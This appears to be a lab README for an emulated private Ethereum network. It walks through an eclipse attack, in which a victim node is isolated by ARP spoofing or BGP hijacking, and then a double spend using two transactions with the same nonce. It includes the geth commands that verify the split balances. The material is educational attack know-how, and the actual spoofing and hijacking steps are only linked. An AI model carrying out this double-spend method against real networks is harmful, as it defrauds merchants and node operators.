# Ethereum Proof-of-Work: Eclipse Attack & Double Spend Guide

This repository demonstrates the execution of an Eclipse Attack on a private Ethereum Proof-of-Work (PoW) network, followed by a Double Spend exploit. 

To demonstrate different threat models, this project includes two distinct methods for isolating the victim node: a localized **Layer 2 ARP Spoofing** attack, and a global **Layer 3 BGP Hijacking** attack.

### Network Architecture
The network is built using the SeedEmu framework across three interconnected Autonomous Systems (AS):
* **The Main Network:** AS 160 (`.71` BootNode Miner) and AS 161 (`.71` Miner)
* **The Victim:** AS 162 (`as162h-Ethereum-POW-02-Miner-10.162.0.71`)
* **The ARP Attacker (Layer 2):** AS 162 (`as162h-new_eth_node-10.162.0.74`)
* **The BGP Attacker (Layer 3):** AS 161 Border Router (`as161brd-router0-10.161.0.254`)


---

## Phase 1: The Eclipse Attack (Isolation)

To initiate the exploit, the Victim must first be partitioned from the rest of the network. Select **one** of the following attack vectors to execute Phase 1, then return to this guide to proceed with Phase 2.

* **[Execute Layer 2 ARP Spoofing Isolation](./l2_arp_spoofing/README_ARP.md)** (Localized Subnet Attack)
* **[Execute Layer 3 BGP Hijacking Isolation](./l3_bgp_hijacking/README_BGP.md)** (Global Infrastructure Attack)

---

## Phase 2: The Double Spend

*Note: Ensure Phase 1 has been successfully executed from one of the modules above before proceeding.*

With the network partitioned, the blockchain splits into two competing states. As Node 162 continues to mine, it generates an isolated, independent chain. 

**Network Participants:**
* **Attacker Origin (10 ETH):** `0xCBF1...` 
* **Victim Merchant (30 ETH):** `0xF540...`
* **Attacker Safe/Bob (0 ETH):** `0xaB5A...`

**Transaction Injection Methodology:** The core of a Double Spend relies on the **Nonce** (the transaction counter for an account). [`fake_tx.py`](fake_tx.py) and [`real_tx.py`](real_tx.py) are explicitly coded to use the *exact same Nonce* from the Origin account. The Ethereum protocol dictates an account can only use a specific nonce once. By routing the fraudulent transaction to the isolated victim and the legitimate transaction to the main network, both chains process their respective transactions as valid.

**1. Inject the Transactions (From Host VM):**
Execute the Python scripts to send conflicting transactions to the partitioned networks.
```bash
python3 fake_tx.py  # Sends 5 ETH to Victim Merchant (Isolated to Node 162)
python3 real_tx.py  # Sends 1 ETH to Attacker Safe (Broadcast to Nodes 160 & 161)
```

**2. Verify the State Divergence:**
Check the balances to confirm the network state has successfully fractured.

**Main Network Balances (Node 160 or 161):**
```bash
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec '["0xCBF1e330F0abD5c1ac979CF2B2B874cfD4902E24", "0xF5406927254d2dA7F7c28A61191e3Ff1f2400fe9", "0xaB5AaD8284868B91Eb537d28aB1A159740D54890"].forEach(addr => { console.log(addr + ": " + web3.fromWei(eth.getBalance(addr), "ether") + " ETH") })'
```
> **Expected Output (Main Chain):**
> Origin: `8.999 ETH` (Spent 1 ETH + Gas)
> Victim: `30 ETH` (Unchanged)
> Bob: `1 ETH` (Received funds)

**Isolated Network Balances (Node 162):**
```bash
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec '["0xCBF1e330F0abD5c1ac979CF2B2B874cfD4902E24", "0xF5406927254d2dA7F7c28A61191e3Ff1f2400fe9", "0xaB5AaD8284868B91Eb537d28aB1A159740D54890"].forEach(addr => { console.log(addr + ": " + web3.fromWei(eth.getBalance(addr), "ether") + " ETH") })'
```
> **Expected Output (Isolated Chain):**
> Origin: `4.999 ETH` (Spent 5 ETH + Gas)
> Victim: `35 ETH` (Payment appears successful to the victim)
> Bob: `0 ETH` (Unchanged)

---

## Phase 3: The Chain Reorganization

To finalize the exploit, the network connection must be restored, prompting a chain reorganization that invalidates the isolated state. Return to the selected module from Phase 1 to execute the network reconnection:

* **[Heal Layer 2 ARP Spoofing](./l2_arp_spoofing/README_ARP.md#phase-3-the-chain-reorganization-the-vanish)**
* **[Heal Layer 3 BGP Hijacking](./l3_bgp_hijacking/README_BGP.md#phase-3-the-chain-reorganization-the-vanish)**

---

## Appendix: Helper Commands


### Engine Initialization & Mining Management

**1. Node 160 (BootNode Miner)**

```bash
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "miner.stop()"
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "miner.setEtherbase(eth.accounts[0])"
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "miner.start(1)"
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "eth.mining"
```

**2. Node 161 (Real World Miner)**

```bash
docker exec -it as161h-Ethereum-POW-01-Miner-10.161.0.71 geth attach --exec "miner.stop()"
docker exec -it as161h-Ethereum-POW-01-Miner-10.161.0.71 geth attach --exec "miner.setEtherbase(eth.accounts[0])"
docker exec -it as161h-Ethereum-POW-01-Miner-10.161.0.71 geth attach --exec "miner.start(1)"
docker exec -it as161h-Ethereum-POW-01-Miner-10.161.0.71 geth attach --exec "eth.mining"
```

**3. Node 162 (The Victim)**

```bash
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "miner.stop()"
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "miner.setEtherbase(eth.accounts[0])"
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "miner.start(1)"
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "eth.mining"
```

---

### Diagnostics

**Check Current Block Heights:**
```bash
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "eth.blockNumber"
docker exec -it as161h-Ethereum-POW-01-Miner-10.161.0.71 geth attach --exec "eth.blockNumber"
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "eth.blockNumber"
```
**Check Who Mined the Latest Blocks:**
```bash
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec 'var latest = eth.blockNumber; for (var i = latest; i > latest - 5; i--) { var b = eth.getBlock(i); console.log("Block #" + i + " Miner: " + b.miner); }'
```
**Find the Local Mining Accounts:**
```bash
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "eth.accounts"
docker exec -it as161h-Ethereum-POW-01-Miner-10.161.0.71 geth attach --exec "eth.accounts"
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "eth.accounts"
```

**Check Pending Transactions:**
```bash
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "txpool.status"
docker exec -it as161h-Ethereum-POW-01-Miner-10.161.0.71 geth attach --exec "txpool.status"
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "txpool.status"
```